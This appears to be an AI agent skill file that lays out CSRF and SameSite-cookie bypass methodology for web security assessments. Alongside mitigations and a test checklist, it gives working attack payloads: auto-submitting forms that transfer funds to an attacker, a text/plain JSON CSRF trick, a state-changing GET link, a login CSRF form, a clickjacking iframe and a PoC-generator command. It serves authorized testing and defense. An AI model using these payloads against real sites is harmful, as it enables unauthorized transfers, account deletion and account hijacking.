---
name: offensive-csrf-samesite
description: "CSRF (Cross-Site Request Forgery) attack methodology and SameSite cookie bypass — classic CSRF token absence, token validation flaws (token-not-bound-to-session, token comparison weaknesses), CSRF on JSON endpoints (Content-Type bypass), CSRF via XHR/Fetch, SameSite=Lax bypasses (top-level GET, 2-minute fresh-creation window), SameSite=None implications, CORS misconfiguration enabling CSRF, login CSRF, and clickjacking-as-CSRF-amplifier. Use when assessing state-changing endpoints' anti-CSRF posture or analyzing SameSite cookie defenses."
---

# CSRF & SameSite Bypass

CSRF was supposed to be killed by SameSite=Lax becoming default in Chrome (2020). It wasn't — Lax has known carve-outs, many sites still use SameSite=None for compatibility, and JSON-based CSRF surfaces have grown. The bug class persists; the defaults moved.

## Quick Workflow

1. Identify state-changing endpoints (POST, PUT, PATCH, DELETE)
2. Check anti-CSRF token presence + validation strength
3. Check `SameSite` attribute on session cookies
4. For each endpoint, build a cross-origin PoC and observe success/failure
5. Test CORS misconfigurations that enable read-after-CSRF

---

## CSRF Basics — When Does It Work?

```
Site A (attacker.com):     <form action="https://victim.com/transfer" method="POST">
                              <input name="to" value="attacker"/>
                              <input name="amount" value="1000"/>
                            </form>
                            <script>document.forms[0].submit()</script>

Site B (victim.com):        Receives POST with cookies attached → executes
```

For this to work, ALL must hold:
- Victim is logged in (session cookie present)
- Cookie's `SameSite` allows cross-site sending
- Endpoint accepts the simple POST (form-encoded, no preflight)
- No CSRF token validated server-side

## Anti-CSRF Token Validation Flaws

### Token Not Bound to Session

```http
POST /transfer
Cookie: SESSIONID=victim
csrf_token=ATTACKER_TOKEN_FROM_OWN_SESSION
```

If the server validates "is this token in the global pool of valid tokens" instead of "is this token bound to *this* session," any user's token works for any user's request.

### Token Compared Loosely

- `if (a == b)` PHP loose comparison — `0 == "anything"` is true
- Substring match — token `abc` accepted if request token is `abcdef`
- Case-insensitive comparison letting case-mutated forgeries through

### Token in URL (Logged + Leaked)

If the token is in `?csrf=...`, it's in the Referer when the user clicks any external link → token leaks to third parties.

### Token Static / Predictable

Per-user static tokens (token = MD5(user_id)) → attacker who knows the algorithm forges any token.

## JSON CSRF

The Content-Type matters:

| Content-Type | Browser Sends Cross-Origin? | CSRF Possible? |
|---|---|---|
| `application/x-www-form-urlencoded` | Yes (simple) | Yes |
| `multipart/form-data` | Yes (simple) | Yes |
| `text/plain` | Yes (simple) | Yes — for endpoints accepting it |
| `application/json` | No (preflight) | Only if endpoint also accepts text/plain |

```html
<!-- text/plain CSRF for JSON endpoint -->
<form action="https://victim.com/api/transfer" method="POST" enctype="text/plain">
  <input name='{"to":"attacker","amount":1000,"x":"' value='"}'/>
</form>
<script>document.forms[0].submit();</script>
<!-- Body becomes: {"to":"attacker","amount":1000,"x":"="} which is valid JSON -->
```

If the API endpoint does not strictly require `Content-Type: application/json`, this works.

### XHR with Custom Header

CSRF via fetch is preflighted — defeated by browser. Custom header on the actual endpoint = effective CSRF defense:

```javascript
fetch('/api/transfer', {
  method: 'POST',
  headers: { 'X-Requested-With': 'XMLHttpRequest', 'Content-Type': 'application/json' },
  body: JSON.stringify({to: 'me', amount: 1})
})
```

If `X-Requested-With: XMLHttpRequest` is required server-side, cross-origin attacker can't add it without preflight.

## SameSite Bypass

### SameSite=Lax — Top-Level Navigation GET

Lax allows cookies on top-level GET navigations. State-changing GET endpoints become CSRF-vulnerable:

```html
<a href="https://victim.com/api/delete-account?confirm=true">Click here for free $</a>
```

Browser navigates → cookie sent → action executes.

Mitigation: never expose state-changing operations on GET.

### SameSite=Lax — 2-Minute "Lax+POST" Window (Chrome)

Chrome's "Lax+POST" mitigation: cookies marked `SameSite=Lax` (or unmarked, defaulting to Lax) are sent on cross-site POSTs **for 2 minutes after the cookie was set**. If the user just authenticated, classic CSRF still works in that window.

Race the user immediately after login (e.g. via login-CSRF combined with attack chain).

### SameSite=None Without `Secure`

`SameSite=None` requires `Secure` — but legacy / older browsers shipped with permissive enforcement. Some servers still emit `SameSite=None` without `Secure`, leaving cross-site cookie sending wide open.

### Cookies Without SameSite

Older sessions ship cookies without `SameSite`. Modern Chrome treats those as Lax-by-default, but Safari and older Firefox versions don't. Cross-browser CSRF varies.

## CORS Misconfiguration Enabling CSRF-with-Read

CSRF normally writes; CORS misconfig lets attacker also *read* the response:

```http
GET /api/profile
Origin: https://attacker.com

→ Access-Control-Allow-Origin: https://attacker.com
   Access-Control-Allow-Credentials: true
```

If the server reflects `Origin` and allows credentials, attacker reads sensitive responses cross-origin. See `offensive-cors-misconfig` (planned).

## Login CSRF

Force the victim into the attacker's account:

1. Attacker has account at victim.com
2. Crafts cross-site POST that logs the victim in as the attacker
3. Victim now operates in attacker's account; subsequent actions populate attacker's data (search history, saved files, etc.)

```html
<form action="https://victim.com/login" method="POST">
  <input name="username" value="attacker_account"/>
  <input name="password" value="attacker_pass"/>
</form>
<script>document.forms[0].submit();</script>
```

Defeats: same-origin only on login, CSRF token on login form, separate ASP/JSF view-state.

## Clickjacking as CSRF Amplifier

When the action requires a button click but no token, frame the victim site and trick the user into clicking through your overlay. See `offensive-clickjacking-ui-redress` (planned).

```html
<iframe src="https://victim.com/admin/delete-everything"></iframe>
<style>iframe { opacity: 0.001; }</style>
```

`X-Frame-Options: DENY` or `frame-ancestors 'none'` blocks this.

## Bypass Tooling

```bash
# Burp generates CSRF PoC HTML for any captured request
# Right-click → Engagement Tools → Generate CSRF PoC

# csrfpoc CLI
git clone https://github.com/dolevf/csrfpoc
csrfpoc -u "https://victim.com/api/transfer" -m POST -d 'to=attacker&amount=1000'
```

## Engagement Cheatsheet

```
[ ] List every state-changing endpoint
[ ] For each: SameSite of session cookie
[ ] For each: anti-CSRF token presence + validation type
[ ] Generate cross-origin PoC, test in real browser
[ ] Test text/plain or form-data fallback if JSON-only assumed
[ ] Test cross-user token reuse (token from your account → other user's request)
[ ] Test login CSRF
[ ] Test SameSite=Lax + GET-state-change
[ ] Test 2-minute SameSite=Lax+POST window post-auth
[ ] Test framing for clickjacking-CSRF combo
[ ] Test CORS for read-amplification
```

---

## Key References

- OWASP CSRF Prevention Cheat Sheet
- "SameSite cookies explained" — web.dev
- PortSwigger Web Security Academy: CSRF, SameSite chapters
- Source: https://github.com/SnailSploit/offensive-checklist/blob/main/csrf.md
